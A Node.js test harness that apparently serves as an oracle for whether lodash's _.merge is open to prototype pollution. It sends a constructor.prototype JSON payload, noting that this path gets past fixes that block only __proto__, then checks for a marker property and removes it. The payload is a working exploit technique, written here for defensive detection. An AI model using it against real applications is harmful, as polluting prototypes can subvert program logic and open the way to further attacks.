const _ = require('lodash');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  // Unique-ish marker to avoid collisions with unrelated prototype props.
  const marker = '__oracle_pp_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2) + '__';

  // Cleanup in case environment is dirty.
  try { delete Object.prototype[marker]; } catch (_) {}

  // Benign public operation: merge nested plain objects.
  const benignTarget = {};
  const benignSource = { a: { b: 1 } };
  const benignResult = _.merge(benignTarget, benignSource);
  if (!benignResult || !benignResult.a || benignResult.a.b !== 1 || benignTarget.a.b !== 1) {
    throw new Error('benign _.merge failed');
  }

  operation_completed = true;

  // Malicious payload for lodash prototype pollution in merge defaults paths.
  // Using constructor.prototype path is important because some fixes block __proto__ only.
  const payload = JSON.parse('{"constructor":{"prototype":{"' + marker + '":"polluted"}}}');

  let threw = false;
  let throwMsg = '';
  try {
    _.merge({}, payload);
  } catch (e) {
    threw = true;
    throwMsg = e && e.message ? e.message : String(e);
  }

  const polluted = ({}[marker] === 'polluted');
  exploit_succeeded = polluted;

  if (polluted) {
    evidence = 'Object prototype polluted via _.merge with constructor.prototype payload';
  } else if (threw) {
    evidence = 'malicious merge blocked with throw: ' + throwMsg;
  } else {
    evidence = 'malicious merge completed without observable prototype pollution';
  }

  // Best-effort cleanup.
  try { delete Object.prototype[marker]; } catch (_) {}
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure: ' + (e && e.message ? e.message : String(e));
}

emit();